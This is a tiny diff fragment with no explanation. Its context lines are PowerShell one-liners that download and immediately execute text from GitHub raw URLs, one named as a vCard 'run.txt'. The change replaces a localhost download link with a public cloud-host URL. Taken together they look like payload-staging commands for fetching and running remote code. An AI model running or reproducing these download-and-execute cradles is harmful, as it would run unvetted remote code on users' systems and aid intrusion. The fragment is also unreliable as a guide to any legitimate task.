@@ -5,4 +5,4 @@ IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/caioMichele/vCard/main/run.txt')
 
 
-https://127.0.0.1:7443/direct/download/26b26554-8087-44e4-bd69-6e431ee973b8
+http://ec2-35-178-193-155.eu-west-2.compute.amazonaws.com/here
